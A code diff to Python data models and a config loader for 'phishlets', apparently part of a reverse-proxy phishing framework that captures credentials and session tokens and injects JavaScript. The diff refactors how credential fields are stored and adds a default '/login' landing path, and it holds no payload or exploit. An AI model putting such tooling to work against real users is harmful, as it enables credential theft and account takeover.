@@ -43,6 +43,7 @@ class AuthToken(BaseModel):
     name: Optional[str] = None
 
 class CredentialField(BaseModel):
+    name: str
     key: str
     search: str
     type: str
@@ -96,13 +97,13 @@ class PhishletConfig(BaseModel):
     proxy_hosts: List[ProxyHost]
     sub_filters: List[SubFilter] = Field(default_factory=list)
     auth_tokens: List[Union[AuthToken, Dict[str, Any]]]
-    credentials: Dict[str, CredentialField] = Field(default_factory=dict)
+    credentials: List[CredentialField] = Field(default_factory=list)
     login: Optional[LoginConfig] = None
     js_inject: List[JsInject] = Field(default_factory=list)
     
     # Legacy fields (optional)
     auth_urls: Optional[List[str]] = None
-    landing_path: Optional[List[str]] = None
+    landing_path: Optional[List[str]] = Field(default_factory=lambda: ["/login"])
     injections: Optional[List[Any]] = None
     headers: List[HeaderRule] = Field(default_factory=list)
     path_rewrites: List[PathRewrite] = Field(default_factory=list)
@@ -122,14 +123,15 @@ class PhishletLoader:
             
             # Handle legacy list-based credentials
             if isinstance(data.get("credentials"), list):
-                new_creds = {}
+                new_creds = []
                 for cred in data["credentials"]:
-                    name = cred.get("name", "unknown")
-                    new_creds[name] = CredentialField(
-                        key=name,
+                    nm = cred.get("name", "unknown")
+                    new_creds.append(CredentialField(
+                        name=nm,
+                        key=nm,
                         search="(.*)",
                         type=cred.get("type", "post_param")
-                    )
+                    ))
                 data["credentials"] = new_creds
 
             # Handle legacy proxy_hosts
